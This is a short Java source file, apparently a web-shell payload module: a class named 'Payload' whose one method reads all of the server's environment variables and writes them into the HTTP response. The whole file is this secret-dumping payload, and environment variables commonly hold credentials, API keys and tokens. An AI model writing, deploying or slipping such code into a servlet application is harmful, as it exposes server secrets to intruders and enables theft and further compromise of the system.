import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.Iterator;
import java.util.Map;


public class Payload {
  public void e(Object request,Object response)throws Exception {
        HttpServletResponse httpServletResponse = (HttpServletResponse) response;
        StringBuilder info = new StringBuilder();
        Map<String ,String> environment = System.getenv();//env
        Iterator<String> iterator = environment.keySet().iterator();
        while (iterator.hasNext()){
            String next = iterator.next();
            info.append(next+"---"+(String) environment.get(next));
        }
        (response).getWriter().write(info.toString());
    }
}